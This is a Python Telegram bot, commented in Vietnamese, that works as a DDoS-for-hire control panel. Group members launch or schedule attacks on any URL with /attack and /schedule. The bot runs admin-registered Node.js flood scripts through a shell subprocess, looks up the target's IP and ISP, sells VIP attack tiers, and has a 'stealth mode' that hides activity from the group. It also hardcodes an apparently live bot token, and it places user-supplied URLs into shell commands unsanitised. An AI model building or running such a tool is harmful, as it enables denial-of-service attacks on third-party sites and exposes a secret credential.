import time, asyncio, socket, requests, os, httpx, sqlite3, psutil, random, string
from urllib import parse
from datetime import datetime, timedelta
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler
from pytz import timezone
from html import escape

# --- CẤU HÌNH HỆ THỐNG ---
TOKEN = '8772018236:AAHdo-_qetfsviFAsajdhaMIj8qBWcLMVrQ' 
ADMIN_IDS = [7731091077]
DB_FILE = 'bot_database.db'

active_users = {}      
user_cooldowns = {}    
COOLDOWN_TIME = 30     
scheduled_tasks = {}   # Bộ nhớ đệm lưu các lịch hẹn ngầm

# --- DATABASE LOGIC ---
def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute('CREATE TABLE IF NOT EXISTS methods (name TEXT PRIMARY KEY, type TEXT, url TEXT, time INTEGER, visibility TEXT, command TEXT)')
        c.execute('CREATE TABLE IF NOT EXISTS vip_users (user_id INTEGER PRIMARY KEY)')
        c.execute('CREATE TABLE IF NOT EXISTS groups_allowed (group_id INTEGER PRIMARY KEY)')
        c.execute('CREATE TABLE IF NOT EXISTS blacklist (domain TEXT PRIMARY KEY)')
        c.execute('CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)')
        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("bot_active", "1")')
        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("stealth_mode", "0")')
        conn.commit()

def db_query(query, params=(), fetch=False):
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute(query, params)
        conn.commit()
        if fetch: return c.fetchall()

def get_bot_state():
    res = db_query('SELECT value FROM settings WHERE key="bot_active"', fetch=True)
    return res[0][0] == "1" if res else True

def set_bot_state(active):
    db_query('UPDATE settings SET value=? WHERE key="bot_active"', ("1" if active else "0",))

def get_stealth_mode():
    res = db_query('SELECT value FROM settings WHERE key="stealth_mode"', fetch=True)
    return res[0][0] == "1" if res else False

def set_stealth_mode(active):
    db_query('REPLACE INTO settings (key, value) VALUES ("stealth_mode", ?)', ("1" if active else "0",))

def get_all_methods():
    rows = db_query('SELECT name, type, url, time, visibility, command FROM methods', fetch=True)
    return {r[0]: {'type': r[1], 'url': r[2], 'time': r[3], 'visibility': r[4], 'command': r[5]} for r in rows}

def is_admin(user_id): return user_id in ADMIN_IDS

def lay_ip_va_isp(url):
    try:
        ip = socket.gethostbyname(parse.urlsplit(url).netloc)
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        return ip, response.json() if response.ok else {}
    except: return None, {}

def get_thoi_gian_vn(): return datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%H:%M:%S | %d-%m-%Y')

# --- CÔNG TẮC BẬT/TẮT TÀNG HÌNH ---
async def toggle_botro(update, context):
    if not is_admin(update.message.from_user.id): return
    current_mode = get_stealth_mode()
    new_mode = not current_mode
    set_stealth_mode(new_mode)
    
    status_text = "🟢 BẬT (Bơ tất cả mọi người trong Group, chỉ báo cáo về Inbox Admin)" if new_mode else "🔴 TẮT (Bot trả lời công khai trong Group)"
    await update.message.reply_text(f"👻 <b>CÔNG TẮC /BOTRO:</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\nTrạng thái: <code>{status_text}</code>", parse_mode='HTML')

# --- CÁC HÀM TIỆN ÍCH ---
async def check_website(update, context):
    is_private = update.message.chat.type == 'private'
    user_id = update.message.from_user.id
    if get_stealth_mode() and not is_private: return 
    if is_private and not is_admin(user_id): return await update.message.reply_text("🚫 <b>Bot chỉ hoạt động trong Group!</b>", parse_mode='HTML')
    
    if len(context.args) < 1: return await update.message.reply_text("⚠️ <b>Cú pháp:</b> <code>/check [url]</code>", parse_mode='HTML')
    url = context.args[0]
    if not url.startswith(('http://', 'https://')): url = 'https://' + url
    sent_msg = await update.message.reply_text(f"🔍 <b>Đang phân tích:</b> <code>{url}</code>...", parse_mode='HTML')
    try:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
            st = time.time()
            resp = await client.get(url)
            ms = round((time.time() - st) * 1000, 2)
            sc = resp.status_code
            icon = "🟢" if 200 <= sc < 300 else "🟡" if sc < 400 else "🔴"
            res = f"🌐 <b>NETWORK SCANNER</b> 🌐\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n🎯 <b>Mục tiêu:</b> <code>{url}</code>\n🚦 <b>Trạng thái:</b> {icon} <code>{sc}</code>\n⚡ <b>Ping:</b> <code>{ms}ms</code>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"
    except: res = "❌ <b>LỖI KẾT NỐI</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n⚠️ <i>Host không phản hồi hoặc timeout.</i>"
    await sent_msg.edit_text(res, parse_mode='HTML')

async def danh_sach_phuong_thuc(update, context):
    is_private = update.message.chat.type == 'private'
    user_id = update.message.from_user.id
    if get_stealth_mode() and not is_private: return 
    if is_private and not is_admin(user_id): return await update.message.reply_text("🚫 <b>Bot chỉ hoạt động trong Group!</b>", parse_mode='HTML')
    
    methods_data = get_all_methods()
    if not methods_data: return await update.message.reply_text("📭 <b>Hệ thống chưa có dữ liệu.</b>", parse_mode='HTML')
    msg = "⚔️ <b>DANH SÁCH KỸ THUẬT</b> ⚔️\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n"
    vip, free = [], []
    for name, data in methods_data.items():
        line = f"▪️ <code>{name.ljust(12)}</code> | {data.get('type', 'UNK').ljust(4)} | <code>{data['time']}s</code>"
        vip.append(line) if data.get('visibility') == 'VIP' else free.append(line)
    if vip: msg += "👑 <b>Lớp Kỹ Thuật VIP:</b>\n" + "\n".join(vip) + "\n\n"
    if free: msg += "👤 <b>Lớp Kỹ Thuật FREE:</b>\n" + "\n".join(free) + "\n"
    msg += "\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n💡 <i>Cú pháp: /attack [tên] [url]</i>"
    await update.message.reply_text(msg, parse_mode='HTML')

async def help_group(update, context):
    is_private = update.message.chat.type == 'private'
    user_id = update.message.from_user.id
    if get_stealth_mode() and not is_private: return 
    if is_private and not is_admin(user_id): return await update.message.reply_text("🚫 <b>Bot chỉ hoạt động trong Group!</b>", parse_mode='HTML')
    
    user = update.effective_user
    username = f"@{user.username}" if user.username else user.first_name
    help_text = (
        "🤖 <b>SYSTEM COMMAND CENTER</b> 🤖\n━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👋 <b>Welcome,</b> <code>{username}</code>!\n\n"
        "⚔️ <b>[ KHU VỰC TẤN CÔNG ]</b>\n"
        " ├ 🚀 <code>/attack [method] [url]</code>\n"
        " ├ ⏰ <code>/schedule [HH:MM] [method] [url]</code>\n"
        " ├ 🗑 <code>/delschedule [Mã Task]</code>\n"
        " └ 🛑 <code>/pkill</code> <i>(Dừng mọi tiến trình)</i>\n\n"
        "🛠 <b>[ CÔNG CỤ TIỆN ÍCH ]</b>\n"
        " ├ 🔍 <code>/check [url]</code> <i>(Ping host)</i>\n"
        " └ 📋 <code>/methods</code> <i>(List kỹ thuật)</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n💡 <i>Tip: Chỉ hoạt động trong nhóm đã cấp phép.</i>"
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("👨‍💻 Liên Hệ Admin", url="https://t.me/ahba999")]])
    await update.message.reply_text(help_text, parse_mode='HTML', reply_markup=kb)

# --- PANEL: LÊN LỊCH & HỦY LỊCH (DÀNH CHO VIP) ---
async def dat_lich(update, context):
    user_id = update.message.from_user.id
    is_stealth = get_stealth_mode()
    is_private = update.message.chat.type == 'private'

    async def reply_error(text):
        if not is_stealth or is_private: await update.message.reply_text(text, parse_mode='HTML')

    if not get_bot_state() and not is_admin(user_id): return await reply_error("❌ <b>Hệ thống đang bảo trì!</b>")
    if is_private and not is_admin(user_id): return await reply_error("🚫 <b>Lệnh này chỉ được phép dùng trong Group!</b>")

    allowed_groups = [r[0] for r in db_query('SELECT group_id FROM groups_allowed', fetch=True)]
    if not is_private and update.message.chat.id not in allowed_groups and not is_admin(user_id): return await reply_error("🚫 <b>Nhóm chưa được cấp phép.</b>")

    vip_users = [r[0] for r in db_query('SELECT user_id FROM vip_users', fetch=True)]
    if not is_admin(user_id) and user_id not in vip_users: return await reply_error("🔒 <b>Tính năng Tự động Lên lịch chỉ dành riêng cho Đặc Quyền VIP!</b>")

    if len(context.args) < 3: return await reply_error("⚠️ <b>Cú pháp:</b> <code>/schedule HH:MM [method] [url]</code>\nVD: <code>/schedule 14:30 TLS-SUPER https://example.com</code>")

    time_str, method_name, url = context.args[0], context.args[1], context.args[2]

    try:
        vn_tz = timezone('Asia/Ho_Chi_Minh')
        now = datetime.now(vn_tz)
        target_time = datetime.strptime(time_str, "%H:%M").replace(year=now.year, month=now.month, day=now.day, tzinfo=vn_tz)
        if target_time <= now: target_time = target_time + timedelta(days=1)
        delay_seconds = (target_time - now).total_seconds()
    except ValueError:
        return await reply_error("⚠️ <b>Định dạng thời gian sai!</b> Vui lòng dùng chuẩn 24h (VD: 09:15 hoặc 23:00).")

    methods_data = get_all_methods()
    if method_name not in methods_data: return await reply_error("❌ <b>Phương thức không tồn tại!</b>")
        
    blacklist = [r[0] for r in db_query('SELECT domain FROM blacklist', fetch=True)]
    if parse.urlsplit(url).netloc.lower() in blacklist: return await reply_error("🛡️ <b>Mục tiêu nằm trong Blacklist!</b>")

    ip, isp_info = lay_ip_va_isp(url)
    if not ip: return await reply_error("🌐 <b>Lỗi DNS: Không phân giải được IP.</b>")

    attack_time = methods_data[method_name]['time']
    cmd = methods_data[method_name]['command'].replace(methods_data[method_name]['url'], url).replace(str(methods_data[method_name]['time']), str(attack_time))
    username = update.message.from_user.username or update.message.from_user.full_name

    # Tạo Task ID ngẫu nhiên (6 ký tự)
    task_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

    await reply_error(f"✅ <b>[TIMER SET]</b> Yêu cầu đã được đưa vào hệ thống!\n⏰ Tự động kích hoạt: <code>{target_time.strftime('%H:%M | %d/%m/%Y')}</code>\n⏳ Đếm ngược chờ: <code>{int(delay_seconds)}</code> giây.\n\n🆔 <b>Mã Hủy Lịch:</b> <code>{task_id}</code>\n💡 <i>(Gõ /delschedule {task_id} để hủy)</i>")

    task = asyncio.create_task(run_scheduled_attack(delay_seconds, cmd, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private, task_id))
    scheduled_tasks[task_id] = {'task': task, 'user_id': user_id, 'target': url}

async def huy_lich(update, context):
    user_id = update.message.from_user.id
    is_stealth = get_stealth_mode()
    is_private = update.message.chat.type == 'private'

    async def reply_error(text):
        if not is_stealth or is_private: await update.message.reply_text(text, parse_mode='HTML')

    if len(context.args) < 1: return await reply_error("⚠️ <b>Cú pháp:</b> <code>/delschedule [Mã Task]</code>")
    task_id = context.args[0].upper()

    if task_id not in scheduled_tasks: return await reply_error("❌ <b>Không tìm thấy mã lịch hẹn này hoặc nó đã chạy xong!</b>")

    task_info = scheduled_tasks[task_id]
    if task_info['user_id'] != user_id and not is_admin(user_id): return await reply_error("🚫 <b>Bạn không có quyền hủy lịch của người khác!</b>")

    # Hủy tác vụ ngầm
    task_info['task'].cancel()
    del scheduled_tasks[task_id]
    await reply_error(f"🗑 <b>Đã hủy bỏ thành công lịch hẹn:</b> <code>{task_id}</code>\n🎯 Mục tiêu thoát nạn: <i>{task_info['target']}</i>")

async def run_scheduled_attack(delay, command, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private, task_id):
    try:
        await asyncio.sleep(delay)
    except asyncio.CancelledError:
        return # Nếu bị cancel thì thoát hàm ngay lập tức

    if task_id in scheduled_tasks:
        del scheduled_tasks[task_id]

    current_stealth = get_stealth_mode()
    dashboard = (
        "⏰ <b>[AUTO RUN] TỚI GIỜ LÊN LỊCH</b> ⏰\n"
        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        f"👤 <b>VIP Operator:</b> <code>@{escape(username)}</code>\n"
        f"🎯 <b>Target:</b> <code>{url}</code>\n"
        f"🔥 <b>Method:</b> <code>{method_name.upper()}</code>\n"
        f"⏳ <b>Duration:</b> <code>{attack_time}s</code>\n"
        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        f"├ <b>IP:</b> <code>{ip}</code>\n"
        f"└ <b>ISP:</b> <i>{escape(isp_info.get('isp', 'N/A'))}</i>\n"
        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        f"🕒 <b>Time:</b> <code>{get_thoi_gian_vn()}</code>"
    )
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("📊 Monitor Host", url=f"https://check-host.net/check-http?host={url}"),
        InlineKeyboardButton("🛑 Terminate", callback_data="pkill")
    ]])
    
    if current_stealth and not is_private:
        for admin in ADMIN_IDS:
            try: await context.bot.send_message(chat_id=admin, text="🕵️‍♂️ <b>[SHADOW TIMER] Kích hoạt chạy ngầm!</b>\n" + dashboard, parse_mode='HTML', reply_markup=kb)
            except: pass
    else:
        try: await update.message.reply_text(dashboard, parse_mode='HTML', reply_markup=kb)
        except: pass
    
    await thuc_hien_tan_cong(command, update, method_name, context, user_id, current_stealth, is_private)


# --- PANEL: ATTACK DASHBOARD (BÌNH THƯỜNG) ---
async def tao_choi(update, context):
    user_id = update.message.from_user.id
    is_stealth = get_stealth_mode()
    is_private = update.message.chat.type == 'private'
    
    async def reply_error(text):
        if not is_stealth or is_private: await update.message.reply_text(text, parse_mode='HTML')

    if not get_bot_state() and not is_admin(user_id): return await reply_error("❌ <b>Hệ thống đang bảo trì!</b>")
    if is_private and not is_admin(user_id): return await reply_error("🚫 <b>Lệnh này chỉ được phép dùng trong Group!</b>")
        
    allowed_groups = [r[0] for r in db_query('SELECT group_id FROM groups_allowed', fetch=True)]
    if not is_private and update.message.chat.id not in allowed_groups and not is_admin(user_id): return await reply_error("🚫 <b>Nhóm chưa được cấp phép.</b>")
        
    if not is_admin(user_id):
        if active_users.get(user_id, False): return await reply_error("⏳ <b>Bạn đang có 1 tiến trình đang chạy!</b> Vui lòng chờ nó kết thúc.")
        time_passed = time.time() - user_cooldowns.get(user_id, 0)
        if time_passed < COOLDOWN_TIME: return await reply_error(f"❄️ <b>Hệ thống làm mát:</b> Vui lòng đợi <code>{int(COOLDOWN_TIME - time_passed)}s</code>.")

    if len(context.args) < 2: return await reply_error("⚠️ <b>Cú pháp:</b> <code>/attack [method] [url]</code>")

    method_name, url = context.args[0], context.args[1]
    methods_data = get_all_methods()
    if method_name not in methods_data: return await reply_error("❌ <b>Phương thức không tồn tại!</b>")
        
    blacklist = [r[0] for r in db_query('SELECT domain FROM blacklist', fetch=True)]
    if parse.urlsplit(url).netloc.lower() in blacklist: return await reply_error("🛡️ <b>Mục tiêu nằm trong Blacklist!</b>")

    vip_users = [r[0] for r in db_query('SELECT user_id FROM vip_users', fetch=True)]
    method = methods_data[method_name]
    if method['visibility'] == 'VIP' and not is_admin(user_id) and user_id not in vip_users: return await reply_error("🔒 <b>Yêu cầu đặc quyền VIP.</b>")

    ip, isp_info = lay_ip_va_isp(url)
    if not ip: return await reply_error("🌐 <b>Lỗi DNS: Không phân giải được IP.</b>")

    username = update.message.from_user.username or update.message.from_user.full_name
    attack_time = method['time']
    if is_admin(user_id) and len(context.args) > 2:
        try: attack_time = int(context.args[2])
        except: pass

    dashboard = (
        "⚡ <b>ATTACK LAUNCHED</b> ⚡\n"
        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        f"👤 <b>Operator:</b> <code>@{escape(username)}</code> (ID: {user_id})\n"
        f"🎯 <b>Target:</b> <code>{url}</code>\n"
        f"🔥 <b>Method:</b> <code>{method_name.upper()}</code>\n"
        f"⏳ <b>Duration:</b> <code>{attack_time}s</code>\n"
        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        f"├ <b>IP:</b> <code>{ip}</code>\n"
        f"└ <b>ISP:</b> <i>{escape(isp_info.get('isp', 'N/A'))}</i>\n"
        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        f"🕒 <b>Time:</b> <code>{get_thoi_gian_vn()}</code>"
    )
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("📊 Monitor Host", url=f"https://check-host.net/check-http?host={url}"),
        InlineKeyboardButton("🛑 Terminate", callback_data="pkill")
    ]])
    
    if is_stealth and not is_private:
        for admin in ADMIN_IDS:
            try: await context.bot.send_message(chat_id=admin, text="🕵️‍♂️ <b>[SHADOW REPORT] Lệnh ngầm từ Group!</b>\n" + dashboard, parse_mode='HTML', reply_markup=kb)
            except: pass
    else:
        await update.message.reply_text(dashboard, parse_mode='HTML', reply_markup=kb)
    
    cmd = method['command'].replace(method['url'], url).replace(str(method['time']), str(attack_time))
    asyncio.create_task(thuc_hien_tan_cong(cmd, update, method_name, context, user_id, is_stealth, is_private))

async def thuc_hien_tan_cong(command, update, method_name, context, user_id, is_stealth, is_private):
    active_users[user_id] = True          
    user_cooldowns[user_id] = time.time() 
    try:
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        res = f"✅ <b>Tiến trình hoàn tất:</b> <code>{method_name.upper()}</code>"
    except: 
        res = "❌ <b>Lỗi thực thi lệnh!</b>"
    finally:
        active_users[user_id] = False     
        
    if is_stealth and not is_private:
        for admin in ADMIN_IDS:
            try: await context.bot.send_message(chat_id=admin, text=f"{res} (Tự động từ: {user_id})", parse_mode='HTML')
            except: pass
    else:
        try: await context.bot.send_message(update.message.chat.id, res, parse_mode='HTML')
        except: pass

# --- QUẢN TRỊ ADMIN ---
async def vps_stats(update, context):
    if not is_admin(update.message.from_user.id): return
    cpu, ram = psutil.cpu_percent(interval=0.5), psutil.virtual_memory()
    await update.message.reply_text(f"🖥 <b>SERVER MONITORING</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n├ ⚙️ <b>CPU:</b> <code>{cpu}%</code>\n└ 🧠 <b>RAM:</b> <code>{ram.percent}%</code> <i>({ram.used/(1024**3):.2f}GB / {ram.total/(1024**3):.2f}GB)</i>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰", parse_mode='HTML')

async def stop_process(update, context):
    if not is_admin(update.effective_user.id):
        if update.callback_query: await update.callback_query.answer("🚫 Bạn không có quyền!", show_alert=True)
        return
    try:
        # 1. Kill tiến trình node
        process = await asyncio.create_subprocess_shell("pkill -9 -f node")
        await process.communicate()
        
        # 2. Xóa các khóa luồng
        active_users.clear()

        # 3. Hủy TOÀN BỘ các lịch hẹn đang chờ
        for t_id, t_info in scheduled_tasks.items():
            t_info['task'].cancel()
        scheduled_tasks.clear()

    except Exception as e: print(e)
    
    text = "⏹ <b>Đã dọn dẹp tiến trình Node và Hủy toàn bộ Lịch hẹn!</b>"
    if update.callback_query:
        await update.callback_query.answer("Đã dừng khẩn cấp toàn hệ thống!")
        await update.callback_query.message.reply_text(text, parse_mode='HTML')
    else: await update.message.reply_text(text, parse_mode='HTML')

async def bot_on(update, context):
    if is_admin(update.message.from_user.id): set_bot_state(True); await update.message.reply_text("✅ <b>Hệ thống hoạt động.</b>", parse_mode='HTML')

async def bot_off(update, context):
    if is_admin(update.message.from_user.id): set_bot_state(False); await update.message.reply_text("❌ <b>Đã tắt hệ thống.</b>", parse_mode='HTML')

async def them_phuong_thuc(update, context):
    if not is_admin(update.message.from_user.id): return
    method_name, req_method, url = context.args[0], context.args[1].upper(), context.args[2]
    attack_time = 60
    if req_method not in ['GET', 'POST', 'NONE']: return await update.message.reply_text("⚠️ <b>Loại method phải là GET, POST hoặc NONE.</b>", parse_mode='HTML')
    if 'timeset' in context.args:
        try: attack_time = int(context.args[context.args.index('timeset') + 1])
        except: return await update.message.reply_text("🔥 <b>Thời gian không hợp lệ.</b>", parse_mode='HTML')
    visibility = 'VIP' if '[vip]' in context.args else 'MEMBER'
    extra_args = [arg for arg in context.args[3:] if arg not in ['[vip]', '[member]', 'timeset']]
    cmd = f"node --max-old-space-size=65536 {method_name} {url} " + " ".join(extra_args) if req_method == 'NONE' else f"node --max-old-space-size=65536 {method_name} {req_method} {url} " + " ".join(extra_args)
    db_query('REPLACE INTO methods (name, type, url, time, visibility, command) VALUES (?, ?, ?, ?, ?, ?)', (method_name, req_method, url, attack_time, visibility, cmd))
    await update.message.reply_text(f"✅ <b>Đã thêm phương thức:</b> <code>{method_name}</code>", parse_mode='HTML')

async def xoa_phuong_thuc(update, context):
    if not is_admin(update.message.from_user.id): return
    db_query('DELETE FROM methods WHERE name=?', (context.args[0],))
    await update.message.reply_text(f"✅ <b>Đã xóa phương thức:</b> <code>{context.args[0]}</code>", parse_mode='HTML')

async def quan_ly_vip_user(update, context, action):
    if not is_admin(update.message.from_user.id): return
    try: uid = int(context.args[0])
    except: return await update.message.reply_text("⚠️ <b>ID không hợp lệ.</b>", parse_mode='HTML')
    if action == "add":
        db_query('INSERT OR IGNORE INTO vip_users (user_id) VALUES (?)', (uid,))
        await update.message.reply_text(f"✅ <b>Đã cấp VIP cho:</b> <code>{uid}</code>", parse_mode='HTML')
    elif action == "remove":
        db_query('DELETE FROM vip_users WHERE user_id=?', (uid,))
        await update.message.reply_text(f"❌ <b>Đã xóa VIP của:</b> <code>{uid}</code>", parse_mode='HTML')

async def them_nhom(update, context):
    if not is_admin(update.message.from_user.id): return
    try: gid = int(context.args[0])
    except: return await update.message.reply_text("⚠️ <b>ID nhóm không hợp lệ.</b>", parse_mode='HTML')
    db_query('INSERT OR IGNORE INTO groups_allowed (group_id) VALUES (?)', (gid,))
    await update.message.reply_text(f"✅ <b>Đã cấp phép nhóm:</b> <code>{gid}</code>", parse_mode='HTML')

async def xoa_nhom(update, context):
    if not is_admin(update.message.from_user.id): return
    try: gid = int(context.args[0])
    except: return await update.message.reply_text("⚠️ <b>ID nhóm không hợp lệ.</b>", parse_mode='HTML')
    db_query('DELETE FROM groups_allowed WHERE group_id=?', (gid,))
    await update.message.reply_text(f"❌ <b>Đã hủy phép nhóm:</b> <code>{gid}</code>", parse_mode='HTML')

async def quan_ly_blacklist(update, context, action):
    if not is_admin(update.message.from_user.id): return
    domain = context.args[0].lower()
    if action == "add":
        db_query('INSERT OR IGNORE INTO blacklist (domain) VALUES (?)', (domain,))
        await update.message.reply_text(f"✅ <b>Đã đưa vào Blacklist:</b> <code>{domain}</code>", parse_mode='HTML')
    else:
        db_query('DELETE FROM blacklist WHERE domain=?', (domain,))
        await update.message.reply_text(f"✅ <b>Đã gỡ khỏi Blacklist:</b> <code>{domain}</code>", parse_mode='HTML')

async def help_admin(update, context):
    if get_stealth_mode() and update.message.chat.type != 'private': return 
    if not is_admin(update.message.from_user.id): return
    msg = (
        "👑 <b>ADMINISTRATOR PANEL</b> 👑\n━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚙️ <b>[ QUẢN LÝ HỆ THỐNG ]</b>\n"
        " ├ 🟢 <code>/on</code> | 🔴 <code>/off</code>\n"
        " ├ 👻 <code>/botro</code> (Bật/Tắt Tàng Hình)\n"
        " ├ 🛑 <code>/pkill</code> (Clear All Node)\n"
        " └ 📊 <code>/vps</code> (Xem CPU & RAM)\n\n"
        "📂 <b>[ DỮ LIỆU METHOD ]</b>\n"
        " ├ ➕ <code>/add [name] [GET/POST/NONE] [url]</code>\n"
        " └ ➖ <code>/del [name]</code>\n\n"
        "👥 <b>[ KIỂM SOÁT QUYỀN HẠN ]</b>\n"
        " ├ 💎 <b>VIP:</b> <code>/vipuser [id]</code> | <code>/delvip [id]</code>\n"
        " ├ 🏘 <b>Group:</b> <code>/addgroup [id]</code> | <code>/delgroup [id]</code>\n"
        " └ 🛡 <b>BL:</b> <code>/addblacklist [url]</code> | <code>/delblacklist [url]</code>\n━━━━━━━━━━━━━━━━━━━━━━"
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("⚙️ Quản lý Server", url="https://google.com")]])
    await update.message.reply_text(msg, parse_mode='HTML', reply_markup=kb)

def make_handler(func, min_args, help_text, *extra_args):
    async def wrapper(update, context):
        if len(context.args) < min_args:
            return await update.message.reply_text(f"⚠️ <b>Lỗi:</b> {help_text}", parse_mode='HTML')
        if extra_args: await func(update, context, *extra_args)
        else: await func(update, context)
    return wrapper

# --- HÀM MAIN ---
def main():
    init_db()
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", help_group))
    app.add_handler(CommandHandler("help", help_group))
    app.add_handler(CommandHandler("check", check_website))
    app.add_handler(CommandHandler("methods", danh_sach_phuong_thuc))
    app.add_handler(CommandHandler("attack", tao_choi))
    
    app.add_handler(CommandHandler("schedule", dat_lich))
    app.add_handler(CommandHandler("delschedule", huy_lich)) # <--- Lệnh mới hủy lịch
    
    app.add_handler(CommandHandler("botro", toggle_botro))
    app.add_handler(CommandHandler("pkill", stop_process))
    app.add_handler(CallbackQueryHandler(stop_process, pattern="^pkill$"))
    app.add_handler(CommandHandler("on", bot_on))
    app.add_handler(CommandHandler("off", bot_off))
    app.add_handler(CommandHandler("vps", vps_stats))

    app.add_handler(CommandHandler("helpadmin", help_admin))
    app.add_handler(CommandHandler("add", make_handler(them_phuong_thuc, 3, "Cú pháp: /add <name> <GET/POST/NONE> <url> ...")))
    app.add_handler(CommandHandler("del", make_handler(xoa_phuong_thuc, 1, "Cú pháp: /del <name>")))
    app.add_handler(CommandHandler("vipuser", make_handler(quan_ly_vip_user, 1, "Cú pháp: /vipuser <uid>", "add")))
    app.add_handler(CommandHandler("delvip", make_handler(quan_ly_vip_user, 1, "Cú pháp: /delvip <uid>", "remove")))
    app.add_handler(CommandHandler("addgroup", make_handler(them_nhom, 1, "Cú pháp: /addgroup <gid>")))
    app.add_handler(CommandHandler("delgroup", make_handler(xoa_nhom, 1, "Cú pháp: /delgroup <gid>")))
    app.add_handler(CommandHandler("addblacklist", make_handler(quan_ly_blacklist, 1, "Cú pháp: /addblacklist <domain>", "add")))
    app.add_handler(CommandHandler("delblacklist", make_handler(quan_ly_blacklist, 1, "Cú pháp: /delblacklist <domain>", "remove")))
    
    print("🚀 Bot đã khởi động! (Đã thêm Hủy Lịch /delschedule)")
    app.run_polling()

if __name__ == "__main__": main()
